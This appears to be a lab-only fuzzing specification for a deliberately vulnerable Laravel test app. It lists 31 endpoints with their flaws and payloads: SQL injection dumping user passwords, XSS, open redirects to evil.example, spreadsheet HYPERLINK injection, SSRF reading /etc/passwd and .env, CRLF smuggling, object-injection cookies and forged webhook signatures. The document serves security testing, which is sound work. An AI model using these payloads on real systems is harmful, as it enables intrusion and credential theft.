# Puppy Fort Factory — input-boundary fuzzing specification

Static analysis of the generated `php_laravel` lab app (Ryder's Puppy Fort Factory), dated 2026-10-17. Lab-only: run these only against the loopback-bound lab (`lab/labctl.sh up`) with `--authorized`.

## Scope and method

- **Source analysed:** the app tree rendered by `python3 -m fuzzlab.labgen.assemble --out <dir>` (65 cells, 69 controllers), plus `lab/sql/schema.sql`, `bootstrap/app.php` and the Blade views. No PHP is checked into the repo, so every `source_file_line` below is relative to that generated tree.
- **Verified locally with PHP 8.3:** the parse_url results, the regex bypasses, the TypeErrors, PHP's CRLF rejection in `header()`, the empty-path `ValueError`, and the webhook HMAC values.
- **Not done:** no requests were sent to a running lab.

## Findings to know before running

### Ground-truth problems

- **`/cell/labgen-pl-0017` (secure twin) is still exploitable as XSS.** The scheme allowlist passes `https://a/"><svg ...>` and `https://x/%250aalert(1)`, and the value is printed raw after `javascript:`. The safety matrix marks `url_scheme_allowlist` as fully neutralising, so the cell is probably mislabelled secure.
- **`/comments/share.labgen-cf-0006` (secure twin) is still an open redirect** via `//evil.example`. Its labelled class (header injection) is genuinely closed.

### Cells that always return 500 in the containerized lab

| Cell | Missing in `schema.sql` |
| --- | --- |
| bc-0005 `/booking/checkout` | `bookings` table |
| cf-0001 `/photos/view` | `photos` table (exists only as a migration the image never runs) |
| pl-0003 `/cell/labgen-pl-0003` | `users.password_hash` column (the column is `password`) |
| pl-0009 `/cell/labgen-pl-0009` | `products.active` column |
| pl-0011, pl-0013 | `inventory` table |

With `APP_DEBUG=false` these errors all look alike. The only way to tell them apart is the `db_error` field the coverage middleware writes when a request carries the `X-Fzl-Cov` header.

### Other oversights

- **Mass-assignment cell does nothing.** `/example/account_settings` never updates a row, because `$request->user()` is always null (the app stores `user_id` in the session and never calls `Auth::login`). Unknown keys still cause a 500, which leaks the `users` column names.
- **Coverage blind spot.** `/comments/share` calls `exit`, so the coverage middleware never writes a file for it.
- **Edit-profile form writes the wrong user.** The form sends `user` in the POST body, but the controller reads it from the query string, so every UI submission overwrites user 1 (admin).
- **CSRF is disabled globally** (`bootstrap/app.php:27`), so every POST can be forged cross-site.

## Endpoint index

| # | Endpoint | Source | Strategy |
| --- | --- | --- | --- |
| 1 | `POST /login.php` | `app/Http/Controllers/LabgenPla0001Controller.php:23` | Delimiter injection into a single-quoted string |
| 2 | `GET /product.php?id=` | `app/Http/Controllers/LabgenRplProductController.php:20` | Numeric-context injection (no quote to balance): boolean, UNION against the 6-column products table, time-based, and error-based probes |
| 3 | `GET /blog_post.php?id=` | `app/Http/Controllers/LabgenRplBlogpostController.php:20` | Boolean-blind and time-blind differential pairs |
| 4 | `GET /search.php?q=` | `app/Http/Controllers/LabgenPlRp0001Controller.php:25` | String-delimiter injection inside a LIKE pattern |
| 5 | `POST /edit_profile.labgen-plrp-0401.php?user=  ->  GET /profile.php?user=` | `app/Http/Controllers/LabgenPlrp0401WriteController.php:24-25` | Stored-markup injection |
| 6 | `GET /reviews.php#author=` | `resources/views/cells/labgen-plrp-dom-0001.blade.php:9-12` | Client-only source (no server log or WAF visibility) |
| 7 | `GET /feedback.php?ref=` | `resources/views/cells/labgen-plrp-dom-0002.blade.php:9-11` | Client-side innerHTML injection |
| 8 | `GET /cell/labgen-pl-0001?id=` | `app/Http/Controllers/LabgenPl0001Controller.php:20` | UNION column-count probing with JSON diffing. |
| 9 | `GET /cell/labgen-pl-0007?sort=` | `app/Http/Controllers/LabgenPl0007Controller.php:24` | ORDER BY-context injection: conditional ordering, subquery-driven timing, error functions, and a null/empty sort. |
| 10 | `GET /cell/labgen-pl-0009?sort=` | `app/Http/Controllers/LabgenPl0009Controller.php:24` | Parser-precedence oracle: a syntax-error payload against a well-formed one, compared through db_error in the coverage file. |
| 11 | `GET /cell/labgen-pl-0011?alias=  (and /cell/labgen-pl-0013)` | `app/Http/Controllers/LabgenPl0011Controller.php:20; LabgenPl0013Controller.php:25` | Identifier-context injection that must stay syntactically valid at all three insertion points. |
| 12 | `POST /cell/labgen-pl-0003` | `app/Http/Controllers/LabgenPl0003Controller.php:23-24` | Same delimiter injection as /login.php, read through the X-Fzl-Cov db_error oracle: syntax error versus unknown column. |
| 13 | `GET /cell/labgen-pl-0015?url=` | `resources/views/cells/labgen-pl-0015.blade.php:6` | JS-context execution with no breakout, plus attribute breakout. |
| 14 | `GET /cell/labgen-pl-0016?url=` | `resources/views/cells/labgen-pl-0016.blade.php:6` | Escaping-context mismatch: quote-free payloads, plus entity round-trip. |
| 15 | `GET /cell/labgen-pl-0017?url=  (secure twin)` | `app/Http/Controllers/LabgenPl0017Controller.php:21` | Allowlist-passing polyglots: scheme-valid attribute breakout, and JS label/comment newline smuggling (double-encoded so PHP decodes once and the browser once). |
| 16 | `GET /cell/labgen-pl-0018?theme=  /  GET /cell/labgen-pl-0019?theme=` | `resources/views/cells/labgen-pl-0018.blade.php:6; labgen-pl-0019.blade.php:6` | Unquoted-attribute whitespace and slash delimiter injection |
| 17 | `GET /search.labgen-pl-rp-0003.php?q=  /  GET /search.labgen-pl-rp-0005.php?q=` | `resources/views/cells/labgen-pl-rp-0003.blade.php:9; labgen-pl-rp-0005.blade.php:7` | Body-context tag injection |
| 18 | `GET /booking/continue?return_to=` | `app/Http/Controllers/LabgenBc0001Controller.php:22` | Absolute URL, protocol-relative, backslash-normalization, and scheme confusion. |
| 19 | `GET /comments/share?next=` | `app/Http/Controllers/LabgenCf0005Controller.php:40-41` | Open-redirect targets, plus CRLF probes as a negative control: expect 200 with no Location header and a PHP warning. |
| 20 | `GET /comments/share.labgen-cf-0006?next=  (secure twin)` | `app/Http/Controllers/LabgenCf0006Controller.php:24-25,34` | Allowlist-conformant protocol-relative URL. |
| 21 | `GET /extranet/export?label=` | `app/Http/Controllers/LabgenBc0003Controller.php:23` | Spreadsheet-formula injection |
| 22 | `GET /extranet/export.labgen-bc-0004?label=  (secure twin)` | `app/Http/Controllers/LabgenBc0004Controller.php:28` | Delimiter injection to move the formula away from the checked position. |
| 23 | `POST /booking/checkout  /  POST /booking/checkout.labgen-bc-0006` | `app/Http/Controllers/LabgenBc0005Controller.php:23; LabgenBc0006Controller.php:25` | Business-logic price tampering |
| 24 | `GET /photos/view?id=` | `app/Http/Controllers/LabgenCf0001Controller.php:35` | Sequential id enumeration across two sessions |
| 25 | `POST /groups/webhook  /  POST /webhooks/events` | `app/Http/Controllers/LabgenCf0003Controller.php:22,32; LabgenHhb0001Controller.php:22,32` | Forged signatures computed with the leaked secret |
| 26 | `GET /messages/unfurl?url=` | `app/Http/Controllers/LabgenHhb0003Controller.php:25,35` | Scheme confusion (file://, php://filter) |
| 27 | `GET /messages/unfurl.labgen-hhb-0004?url=  (secure twin)` | `app/Http/Controllers/LabgenHhb0004Controller.php:32-37` | Redirect-chain bypass |
| 28 | `GET /integrations/outgoing-webhook?triggerWord=` | `app/Http/Controllers/LabgenHhb0005Controller.php:27` | CRLF delimiter injection into an outbound HTTP header block |
| 29 | `GET /settings/preferences  (Cookie: pref=)` | `app/Http/Controllers/LabgenCf0007Controller.php:34,38` | Object injection: class-instantiation probes, then gadget-chain reachability (phpggc Laravel/* chains against the installed vendor tree) |
| 30 | `POST /example/account_settings` | `app/Http/Controllers/LabgenMa0003Controller.php:37` | Key-space fuzzing (column enumeration) |
| 31 | `POST /register.php` | `app/Http/Controllers/LabgenPla0003Controller.php:24,41-47` | Null/omitted fields |

## Endpoint details

### 1. `POST /login.php`

- **Source:** `app/Http/Controllers/LabgenPla0001Controller.php:23`
- **Developer assumption:** username is a plain account name typed into the login form; the password clause added by ->where() keeps the check tied to the right account.
- **UI path:** Nav 'Log in' -> GET /login.php form -> submit username/password. On success the session gets user_id and the browser is redirected to /profile.php.
- **Flaw:** username is concatenated into whereRaw("username = '...'") with no escaping. Laravel does not wrap raw wheres in parentheses, so an OR in username outranks the appended `and password = ?`. password goes through md5() with no type check: an array throws a TypeError (500) and a missing value gives md5('').
- **Strategy:** Delimiter injection into a single-quoted string; operator-precedence abuse against the appended AND clause; comment truncation that also hides the bound placeholder (tests how PDO counts placeholders); type confusion on password.

Payloads:

```text
username=' OR 1=1 OR '&password=x
username=admin' OR '1'='1' OR '&password=x
username=admin'-- -&password=x
username=admin'#&password=x
username='&password=x
username=admin&password[]=x
```

### 2. `GET /product.php?id=`

- **Source:** `app/Http/Controllers/LabgenRplProductController.php:20`
- **Developer assumption:** id is a positive integer taken from a product link.
- **UI path:** Nav 'Product' or a product link from /products.php -> /product.php?id=N.
- **Flaw:** Raw concatenation in an unquoted numeric context ("... WHERE id = " . $id) with no cast or validation. A query('id') array becomes the string 'Array' plus a warning that Laravel turns into an ErrorException.
- **Strategy:** Numeric-context injection (no quote to balance): boolean, UNION against the 6-column products table, time-based, and error-based probes; integer overflow; array type confusion.

Payloads:

```text
0 OR 1=1
-1 UNION SELECT 1,username,password,email,full_name,6 FROM users-- -
1 AND SLEEP(3)
1 AND extractvalue(1,concat(0x7e,version()))
9223372036854775808
1'
id[]=1
```

### 3. `GET /blog_post.php?id=`

- **Source:** `app/Http/Controllers/LabgenRplBlogpostController.php:20`
- **Developer assumption:** id is an integer post id taken from the blog index link.
- **UI path:** Nav 'Blog' -> /blog_post.php (defaults to id=1) -> post links.
- **Flaw:** Same raw numeric concatenation as product.php against posts (5 columns). APP_DEBUG=false hides DB errors, so the only oracles are boolean/content differences and timing.
- **Strategy:** Boolean-blind and time-blind differential pairs; UNION width probing against 5 columns.

Payloads:

```text
1 AND 1=1
1 AND 1=2
1 AND IF(SUBSTR((SELECT password FROM users WHERE id=1),1,1)='0',SLEEP(3),0)
-1 UNION SELECT 1,username,password,email,'2020-01-01' FROM users-- -
1 ORDER BY 6-- -
```

### 4. `GET /search.php?q=`

- **Source:** `app/Http/Controllers/LabgenPlRp0001Controller.php:25`
- **Developer assumption:** q is a short free-text search term from the search box.
- **UI path:** Nav 'Search' -> type into the search box -> GET /search.php?q=term.
- **Flaw:** q is spliced into whereRaw("name LIKE '%" . $q . "%'"). There is no quote escaping, and LIKE wildcards (% and _) are not escaped either.
- **Strategy:** String-delimiter injection inside a LIKE pattern; UNION against the 6-column products table; wildcard semantics; backslash escape-of-quote.

Payloads:

```text
%' OR '1'='1
%' AND SLEEP(3)-- -
zzz' UNION SELECT 1,username,password,email,full_name,6 FROM users-- -
\
_
%
```

### 5. `POST /edit_profile.labgen-plrp-0401.php?user=  ->  GET /profile.php?user=`

- **Source:** `app/Http/Controllers/LabgenPlrp0401WriteController.php:24-25 (sink: resources/views/cells/labgen-plrp-0401.blade.php:11)`
- **Developer assumption:** Only the logged-in user edits their own bio. The hidden form field `user` identifies them, and bio is plain text.
- **UI path:** GET /edit_profile.labgen-plrp-0401.php -> textarea 'bio' + hidden input user -> POST -> redirect to /profile.php, which renders the bio.
- **Flaw:** No authentication or ownership check. The target user comes from $request->query('user') with an (int) cast, but the form sends `user` in the POST body, so every UI submission writes user 1 (admin). bio has no type or length check and is rendered with {!! !!}. CSRF is disabled globally (bootstrap/app.php:27), so a cross-site POST can make this write. The same users.bio column is also rendered raw at /cell/labgen-pl-0005 (resources/views/cells/labgen-pl-0005.blade.php:9).
- **Strategy:** Stored-markup injection; IDOR by query-vs-body parameter source confusion; (int)-cast truncation; array type confusion; TEXT length overflow (65,535 bytes) in strict mode.

Payloads:

```text
bio=<img src=x onerror=alert(document.domain)>
bio=<svg onload=alert(1)>
?user=2  body: bio=<details open ontoggle=alert(1)>
?user=2abc  (int cast -> 2)
?user=999999  (findOrFail -> 404)
bio[]=x
bio=<70000 x 'A'>
```

### 6. `GET /reviews.php#author=`

- **Source:** `resources/views/cells/labgen-plrp-dom-0001.blade.php:9-12`
- **Developer assumption:** The author name in the fragment is the reviewer's display name, and the server never sees it.
- **UI path:** Nav 'Reviews' -> a thank-you link carrying #author=Name.
- **Flaw:** location.hash is matched by /author=([^&]*)/, passed through decodeURIComponent, and concatenated into innerHTML. A malformed percent sequence throws an uncaught URIError, which aborts the script.
- **Strategy:** Client-only source (no server log or WAF visibility); HTML injection via innerHTML (a <script> element will not run, so event-handler payloads are needed); encoding robustness.

Payloads:

```text
#author=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
#author=<svg onload=alert(1)>
#author=<script>alert(1)</script>
#author=%E0%A4%A
#x=1&author=<img src=x onerror=alert(2)>
```

### 7. `GET /feedback.php?ref=`

- **Source:** `resources/views/cells/labgen-plrp-dom-0002.blade.php:9-11`
- **Developer assumption:** ref is a referral tag from a marketing link.
- **UI path:** Nav 'Feedback' -> arrive via a link carrying ?ref=source.
- **Flaw:** URLSearchParams.get('ref') goes straight into innerHTML. The server ignores ref, so server-side oracles see nothing.
- **Strategy:** Client-side innerHTML injection; this needs a browser oracle, not response diffing.

Payloads:

```text
<img src=x onerror=alert(document.domain)>
<iframe srcdoc="<script>parent.alert(1)</script>">
<a href=javascript:alert(1)>x</a>
```

### 8. `GET /cell/labgen-pl-0001?id=`

- **Source:** `app/Http/Controllers/LabgenPl0001Controller.php:20`
- **Developer assumption:** id is a product integer, consumed as a JSON API.
- **UI path:** Listed on /catalog (all GET routes are enumerated there). No form; a direct link.
- **Flaw:** Raw numeric concatenation, and every selected column is echoed back as JSON, which gives a clean UNION oracle.
- **Strategy:** UNION column-count probing with JSON diffing.

Payloads:

```text
-1 UNION SELECT 1,2,3,4,5,6
-1 UNION SELECT 1,username,password,email,full_name,address FROM users
1 OR 1=1
```

### 9. `GET /cell/labgen-pl-0007?sort=`

- **Source:** `app/Http/Controllers/LabgenPl0007Controller.php:24`
- **Developer assumption:** sort is a column name chosen from a sort dropdown.
- **UI path:** Listed on /catalog; in a real UI this would be a 'sort by' select.
- **Flaw:** orderByRaw($sort) with no allowlist; the safe twin labgen-pl-0008 uses a regex. Errors are hidden, so ordering differences and timing are the oracles.
- **Strategy:** ORDER BY-context injection: conditional ordering, subquery-driven timing, error functions, and a null/empty sort.

Payloads:

```text
IF(1=1,id,name)
IF((SELECT SUBSTR(password,1,1) FROM users WHERE id=1)='0',id,name)
id,(SELECT SLEEP(2))
extractvalue(1,concat(0x7e,(SELECT user())))
(empty string)
sort[]=id
```

### 10. `GET /cell/labgen-pl-0009?sort=`

- **Source:** `app/Http/Controllers/LabgenPl0009Controller.php:24`
- **Developer assumption:** sort is a column name. The query filters on products.active.
- **UI path:** Listed on /catalog.
- **Flaw:** Raw ORDER BY concatenation. In the containerized lab, lab/sql/schema.sql's products table has no `active` column, so every request is a 500. With APP_DEBUG=false the only oracle is FzlCoverage's db_error (send header X-Fzl-Cov; MariaDB reports a syntax error before an unknown-column error).
- **Strategy:** Parser-precedence oracle: a syntax-error payload against a well-formed one, compared through db_error in the coverage file.

Payloads:

```text
id
id'
(SELECT 1 FROM
id LIMIT 1
```

### 11. `GET /cell/labgen-pl-0011?alias=  (and /cell/labgen-pl-0013)`

- **Source:** `app/Http/Controllers/LabgenPl0011Controller.php:20; LabgenPl0013Controller.php:25`
- **Developer assumption:** alias is a short SQL table alias such as i2.
- **UI path:** Listed on /catalog.
- **Flaw:** An identifier is concatenated into the query in three places. There is no `inventory` table in lab/sql/schema.sql, so the live lab always returns 500; only the X-Fzl-Cov db_error oracle separates syntax errors from the missing table.
- **Strategy:** Identifier-context injection that must stay syntactically valid at all three insertion points.

Payloads:

```text
i2
i2 JOIN users u ON 1=1 -- 
`i2`
i2;
(empty string)
```

### 12. `POST /cell/labgen-pl-0003`

- **Source:** `app/Http/Controllers/LabgenPl0003Controller.php:23-24`
- **Developer assumption:** A JSON login probe that takes username and password.
- **UI path:** Hidden: POST-only, so it is not listed on /catalog (which shows GET routes only) and has no form.
- **Flaw:** Raw whereRaw on username, but the bound clause filters on a `password_hash` column that does not exist in users (the column is `password`), so every well-formed query fails in the live lab.
- **Strategy:** Same delimiter injection as /login.php, read through the X-Fzl-Cov db_error oracle: syntax error versus unknown column.

Payloads:

```text
username='&password=x
username=' OR 1=1 OR '&password=x
username=admin&password=x
```

### 13. `GET /cell/labgen-pl-0015?url=`

- **Source:** `resources/views/cells/labgen-pl-0015.blade.php:6 (controller LabgenPl0015Controller.php:19)`
- **Developer assumption:** url is a share target.
- **UI path:** Listed on /catalog; the page shows a 'continue' link.
- **Flaw:** Rendered raw inside href="javascript:...", so the value is JavaScript source and can also close the attribute.
- **Strategy:** JS-context execution with no breakout, plus attribute breakout.

Payloads:

```text
alert(document.domain)
"><svg onload=alert(1)>
void(fetch('/profile.php'))
```

### 14. `GET /cell/labgen-pl-0016?url=`

- **Source:** `resources/views/cells/labgen-pl-0016.blade.php:6 (controller LabgenPl0016Controller.php:21)`
- **Developer assumption:** e() makes the value safe.
- **UI path:** Listed on /catalog.
- **Flaw:** HTML-entity escaping is applied in a javascript: URL context, where everything after 'javascript:' is already code. The entities it does emit (&#039;) are decoded by the HTML parser before the JS runs.
- **Strategy:** Escaping-context mismatch: quote-free payloads, plus entity round-trip.

Payloads:

```text
alert(document.domain)
alert(String.fromCharCode(88,83,83))
alert(`x`)
alert('x')
```

### 15. `GET /cell/labgen-pl-0017?url=  (secure twin)`

- **Source:** `app/Http/Controllers/LabgenPl0017Controller.php:21 (sink: resources/views/cells/labgen-pl-0017.blade.php:6)`
- **Developer assumption:** The http/https scheme allowlist neutralizes the javascript: sink. safety_matrix.yaml marks url_scheme_allowlist as `neutralises` for url_javascript_scheme, so this cell is expected to be labeled secure.
- **UI path:** Listed on /catalog.
- **Flaw:** The allowlisted value is still printed raw ({!! !!}) after a hard-coded 'javascript:' prefix. (1) parse_url() still reports scheme https for `https://a/"><svg ...>`, so a quote closes the attribute. (2) `https:` is a valid JS label and `//...` a comment, so a percent-encoded newline (decoded by the browser in the javascript: URL) starts executable code. Both checked: PHP 8.3 parse_url returns 'https' for both shapes. This is likely a ground-truth mislabel.
- **Strategy:** Allowlist-passing polyglots: scheme-valid attribute breakout, and JS label/comment newline smuggling (double-encoded so PHP decodes once and the browser once).

Payloads:

```text
https://a/"><svg onload=alert(document.domain)>
https://x/%250aalert(document.domain)
https://x/%250dalert(1)
https://a/" onmouseover="alert(1)
```

### 16. `GET /cell/labgen-pl-0018?theme=  /  GET /cell/labgen-pl-0019?theme=`

- **Source:** `resources/views/cells/labgen-pl-0018.blade.php:6; labgen-pl-0019.blade.php:6 (e() applied at LabgenPl0019Controller.php:21)`
- **Developer assumption:** theme is a token such as 'dark'. For 0019, e() is assumed sufficient.
- **UI path:** Listed on /catalog; in a real UI this would be a theme toggle.
- **Flaw:** Output goes into an unquoted attribute (data-theme={!! $value !!}). e() does not encode spaces, '/' or '=', so new attributes can be added without '<' or quotes. 0018 is also raw, so tag breakout works there.
- **Strategy:** Unquoted-attribute whitespace and slash delimiter injection; quote-free event handlers.

Payloads:

```text
x onmouseover=alert(1)
x/onmouseover=alert(1)
x style=display:block;width:100vw;height:100vh onmouseover=alert(document.domain)
x><svg onload=alert(1)>
x%09onmouseover=alert(1)
```

### 17. `GET /search.labgen-pl-rp-0003.php?q=  /  GET /search.labgen-pl-rp-0005.php?q=`

- **Source:** `resources/views/cells/labgen-pl-rp-0003.blade.php:9; labgen-pl-rp-0005.blade.php:7`
- **Developer assumption:** q is echoed back as a friendly 'you searched for' line or as the prefilled input value.
- **UI path:** Listed on /catalog; these are the twin URLs carrying /search.php's reflected-XSS shapes (PFF-0003 is exempted at the real URL).
- **Flaw:** Raw reflection: 0003 into the HTML body, 0005 into a double-quoted value attribute.
- **Strategy:** Body-context tag injection; quoted-attribute breakout.

Payloads:

```text
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
" autofocus onfocus=alert(1) x="
</div><script>alert(1)</script>
```

### 18. `GET /booking/continue?return_to=`

- **Source:** `app/Http/Controllers/LabgenBc0001Controller.php:22`
- **Developer assumption:** return_to is a same-site path set by the booking flow.
- **UI path:** Listed on /catalog; in a booking flow it is the 'continue' redirect after login.
- **Flaw:** redirect($return_to) with no check, so any absolute or protocol-relative URL is accepted.
- **Strategy:** Absolute URL, protocol-relative, backslash-normalization, and scheme confusion.

Payloads:

```text
https://evil.example/
//evil.example/
/\evil.example
javascript:alert(1)
%0d%0aSet-Cookie:x=1
```

### 19. `GET /comments/share?next=`

- **Source:** `app/Http/Controllers/LabgenCf0005Controller.php:40-41`
- **Developer assumption:** next is a same-site path.
- **UI path:** Listed on /catalog (CircleFeed share flow).
- **Flaw:** header("Location: " . $next) with no check, so it is an open redirect. CRLF response splitting is blocked by PHP 8.3's header() ('new line detected', verified), as the in-code note concedes. `exit` skips the rest of the Laravel middleware stack, so FzlCoverage never writes a coverage file for this route (a grey-box blind spot).
- **Strategy:** Open-redirect targets, plus CRLF probes as a negative control: expect 200 with no Location header and a PHP warning.

Payloads:

```text
https://evil.example/
//evil.example/
/x%0d%0aSet-Cookie:%20pwn=1
/x%0aX-Injected:%201
```

### 20. `GET /comments/share.labgen-cf-0006?next=  (secure twin)`

- **Source:** `app/Http/Controllers/LabgenCf0006Controller.php:24-25,34`
- **Developer assumption:** Rejecting control characters and requiring a leading '/' makes the target same-site.
- **UI path:** Listed on /catalog.
- **Flaw:** The regex #^/[A-Za-z0-9/_\-\.]*$# accepts '//evil.example' (verified), and redirect()->away() emits it verbatim, giving a protocol-relative open redirect. The labeled class (header injection) is correctly closed; open redirect is not.
- **Strategy:** Allowlist-conformant protocol-relative URL.

Payloads:

```text
//evil.example
//evil.example/path
//127.0.0.1.nip.io/
```

### 21. `GET /extranet/export?label=`

- **Source:** `app/Http/Controllers/LabgenBc0003Controller.php:23`
- **Developer assumption:** label is a plain booking label exported to CSV.
- **UI path:** Listed on /catalog (Booking extranet export).
- **Flaw:** label is written into CSV with no formula neutralization and no quoting, so commas and newlines also inject cells and rows.
- **Strategy:** Spreadsheet-formula injection; CSV delimiter and row injection.

Payloads:

```text
=1+1
=HYPERLINK("http://evil.example","x")
@SUM(1+1)
x,=1+1
x%0a=1+1,0
```

### 22. `GET /extranet/export.labgen-bc-0004?label=  (secure twin)`

- **Source:** `app/Http/Controllers/LabgenBc0004Controller.php:28`
- **Developer assumption:** A leading-character check (^\s*[=+\-@\t\r]) neutralizes formulas.
- **UI path:** Listed on /catalog.
- **Flaw:** Only the start of the whole string is checked, and no CSV quoting is done. A comma starts a new cell and a newline starts a new row, and either can then begin with '='. Verified: both 'safe,=1+1' and 'safe\n=...' pass unprefixed.
- **Strategy:** Delimiter injection to move the formula away from the checked position.

Payloads:

```text
safe,=1+1
safe%0a=HYPERLINK("http://evil.example","x")
safe%0d%0a@SUM(1+1)
"safe",=1+1
```

### 23. `POST /booking/checkout  /  POST /booking/checkout.labgen-bc-0006`

- **Source:** `app/Http/Controllers/LabgenBc0005Controller.php:23; LabgenBc0006Controller.php:25`
- **Developer assumption:** 0005: amount comes from the priced UI. 0006: room_type is one of the dropdown values.
- **UI path:** Hidden: POST-only, with no GET form, so it is absent from /catalog.
- **Flaw:** 0005 trusts a client-supplied price (no sign, range or type check). 0006 indexes a PHP array with $request->input('room_type'); an array value throws TypeError 'Cannot access offset of type array' (verified), and ?? does not catch it. There is no `bookings` table in lab/sql/schema.sql, so 0005 always returns 500 in the live lab; use X-Fzl-Cov to separate db_fault from TypeError.
- **Strategy:** Business-logic price tampering; numeric boundaries; array type confusion on a dictionary lookup.

Payloads:

```text
amount=-129.00
amount=0.001
amount=1e308
amount[]=1
room_type[]=suite
room_type=penthouse  (falls back to 89.00 silently)
```

### 24. `GET /photos/view?id=`

- **Source:** `app/Http/Controllers/LabgenCf0001Controller.php:35`
- **Developer assumption:** Users only open their own photos from their gallery.
- **UI path:** Log in via /login.php (sets session user_id) -> /photos/view?id=N.
- **Flaw:** Photo::where('id', $id) has no owner_id filter, so any authenticated user can read any photo (IDOR); the twin cf-0002 adds the filter. The photos table exists only as a Laravel migration that the image never runs, so the live lab returns 500.
- **Strategy:** Sequential id enumeration across two sessions; array and boolean type confusion.

Payloads:

```text
1
2
0
id[]=2
-1
```

### 25. `POST /groups/webhook  /  POST /webhooks/events`

- **Source:** `app/Http/Controllers/LabgenCf0003Controller.php:22,32; LabgenHhb0001Controller.php:22,32`
- **Developer assumption:** Only the integration partner can produce a valid X-Signature.
- **UI path:** Hidden: server-to-server only, with no UI.
- **Flaw:** The HMAC secret is hard-coded in the controller, so signatures can be forged. The comparison is a loose `!=`; it only juggles when both sides are numeric strings, so a '0e...' magic-hash collision is a negligible-probability probe, not a practical bypass. The twins use hash_equals.
- **Strategy:** Forged signatures computed with the leaked secret; empty, missing and magic-hash signature probes.

Payloads:

```text
body={"event":"ping"}  X-Signature: 27fe49f3c797d5932b0dd796b27f50e694bde40decf32646da6fbc7929720f4c  (circlefeed)
body={"event":"ping"}  X-Signature: 3b4efbee8164e7710e0f748603581c372016ab3c1b39fee039ee8eb9476440df  (huddlehub)
body=<empty>  X-Signature: d308d462d282f8a16e65e650d10c74e68fe96fb12d7e9a13764ce2e427a5f80e  (circlefeed)
X-Signature: 0e0
X-Signature: (absent)
```

### 26. `GET /messages/unfurl?url=`

- **Source:** `app/Http/Controllers/LabgenHhb0003Controller.php:25,35`
- **Developer assumption:** url is a public http(s) link pasted into chat.
- **UI path:** Listed on /catalog (HuddleHub link unfurl).
- **Flaw:** file_get_contents($url) with any scheme and no host restriction, and the first 200 bytes are reflected back. An empty url throws ValueError 'Path cannot be empty' (verified; @ does not suppress it), giving a 500. An array url gives a TypeError.
- **Strategy:** Scheme confusion (file://, php://filter); internal-host SSRF; empty and array type confusion.

Payloads:

```text
file:///etc/passwd
php://filter/convert.base64-encode/resource=/var/www/html/.env
http://127.0.0.1/up
http://db:3306/
(empty string)
url[]=x
```

### 27. `GET /messages/unfurl.labgen-hhb-0004?url=  (secure twin)`

- **Source:** `app/Http/Controllers/LabgenHhb0004Controller.php:32-37`
- **Developer assumption:** Resolving the host once and rejecting private or reserved IPs prevents SSRF.
- **UI path:** Listed on /catalog.
- **Flaw:** Time-of-check vs time-of-use: gethostbyname() resolves once (IPv4 only) and file_get_contents() resolves again. The http wrapper also follows redirects by default (follow_location=1), so a public URL can 302 to 127.0.0.1. Both need a lab-controlled redirector or a rebinding DNS name.
- **Strategy:** Redirect-chain bypass; DNS-rebinding; numeric-host normalization as controls.

Payloads:

```text
http://<lab-redirector>/302?to=http://127.0.0.1/up
http://<rebind-name-public-then-127.0.0.1>/up
http://0x7f000001/
http://[::1]/
HTTP://127.0.0.1/
```

### 28. `GET /integrations/outgoing-webhook?triggerWord=`

- **Source:** `app/Http/Controllers/LabgenHhb0005Controller.php:27`
- **Developer assumption:** triggerWord is a single keyword.
- **UI path:** Listed on /catalog (HuddleHub outgoing-webhook config).
- **Flaw:** triggerWord is concatenated into a raw stream_context header block, so CR/LF injects outbound request headers. The default target, hooks.example.invalid, never resolves; set HUDDLEHUB_WEBHOOK_URL to a lab capture listener to observe the result. The twin hhb-0006 (Laravel Http) rejects CR/LF with a 400, which makes a negative control.
- **Strategy:** CRLF delimiter injection into an outbound HTTP header block; header-to-body smuggling.

Payloads:

```text
x%0d%0aX-Injected:%201
x%0d%0aHost:%20internal.lab
x%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/smuggled%20HTTP/1.1
x%0aX-LF-Only:%201
```

### 29. `GET /settings/preferences  (Cookie: pref=)`

- **Source:** `app/Http/Controllers/LabgenCf0007Controller.php:34,38`
- **Developer assumption:** pref is a cookie the app itself set.
- **UI path:** Listed on /catalog (CircleFeed settings). The cookie is set client-side.
- **Flaw:** unserialize() runs on base64 cookie bytes. EncryptCookies is explicitly disabled for 'pref' (bootstrap/app.php:38), and allowed_classes is not restricted. The response leaks get_class() of the result, which gives a class-instantiation oracle. The serialized value b:0; is reported as unserialize_failed (a false-negative oracle).
- **Strategy:** Object injection: class-instantiation probes, then gadget-chain reachability (phpggc Laravel/* chains against the installed vendor tree); malformed-base64 and type-boundary probes.

Payloads:

```text
Tzo4OiJzdGRDbGFzcyI6MTp7czoxOiJhIjtpOjE7fQ==
YToxOntzOjU6InRoZW1lIjtzOjQ6ImRhcmsiO30=
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MDp7fQ==
YjowOw==
!!!notbase64
```

### 30. `POST /example/account_settings`

- **Source:** `app/Http/Controllers/LabgenMa0003Controller.php:37`
- **Developer assumption:** The body carries only display_name, bio and avatar_url from the settings form.
- **UI path:** GET /example/account_settings (client page) -> its script POSTs the fields.
- **Flaw:** Every request key becomes an UPDATE column name. But $request->user() is always null (the app stores session user_id itself and never calls Auth::login), so the WHERE becomes `id IS NULL` and no rows change. Unknown keys still raise 'Unknown column', which makes a 200-vs-500 users-schema enumeration oracle. display_name and avatar_url themselves are not users columns.
- **Strategy:** Key-space fuzzing (column enumeration); identifier-quoting robustness on keys; nested-array values.

Payloads:

```text
{"bio":"x"}
{"password":"x","username":"admin"}
{"is_admin":1}
{"id`=1,`bio":"x"}
{"bio":{"a":1}}
```

### 31. `POST /register.php`

- **Source:** `app/Http/Controllers/LabgenPla0003Controller.php:24,41-47`
- **Developer assumption:** The form supplies username (50 chars or fewer), email, password and full_name, all as strings.
- **UI path:** Nav 'Register' -> GET /register.php form -> POST.
- **Flaw:** No server-side validation of presence, type or length. A missing password gives md5(null) = md5(''), so an empty-password account can then log in with an empty password. VARCHAR(50/120) overflow in strict mode gives a 500. There is a check-then-insert race against the UNIQUE username (500 on collision). An array username is flattened by where() but breaks the insert.
- **Strategy:** Null/omitted fields; length strain at 50/51 and 120/121; parallel duplicate registration; array type confusion.

Payloads:

```text
username=nopw&email=a@b.c&full_name=x  (password omitted)
username=<51 x 'a'>&email=a@b.c&password=x
email=<121 x 'a'>&username=u2&password=x
username[]=admin&password=x
20 concurrent POSTs with username=race1
```

